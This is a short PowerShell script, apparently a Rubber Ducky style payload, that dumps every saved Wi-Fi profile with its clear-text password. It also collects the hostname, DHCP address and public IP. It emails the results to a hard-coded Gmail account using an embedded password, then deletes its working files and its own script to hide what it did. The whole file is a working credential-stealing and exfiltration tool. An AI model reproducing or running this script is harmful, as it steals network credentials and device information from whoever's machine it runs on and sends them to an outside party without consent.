# 2021 Tom
# Test in progress - Alpha stage

$p = "C:\Users\$env:UserName\IT"
mkdir $p
cd $p

# netsh
netsh wlan export profile key=clear
dir *.xml |% {
$xml=[xml] (get-content $_)
$a= $xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial
Out-File $p\info.txt -Append -InputObject $a
}

# IP Info
$command = {hostname; Get-NetIpaddress | Where PrefixOrigin -EQ DHCP; Invoke-RestMethod http://ipinfo.io/json | Select -exp ip};$command.InvokeReturnAsIs() | Out-File $p\info.txt -Append


$FROM = "patitodegoma404@gmail.com"
$PASS = "RubberDucky404!"
$TO = "patitodegoma404@gmail.com"

$PC_NAME = "$env:computername"
$USER_NAME = "$env:UserName"
$SUBJECT = "El patito de " + $USER_NAME + "@" + $PC_NAME
$BODY = "Info del PC " + $PC_NAME + " user: " + $USER_NAME
$ATTACH = "$p\info.txt"

Send-MailMessage -SmtpServer "smtp.gmail.com" -Port 587 -From ${FROM} -to ${TO} -Subject ${SUBJECT} -Body ${BODY} -Attachment ${ATTACH} -Priority High -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ${FROM}, (ConvertTo-SecureString -String ${PASS} -AsPlainText -force))

rm $p\*.xml
rm $p\*.txt
cd ..
rm $p
rm d.ps1
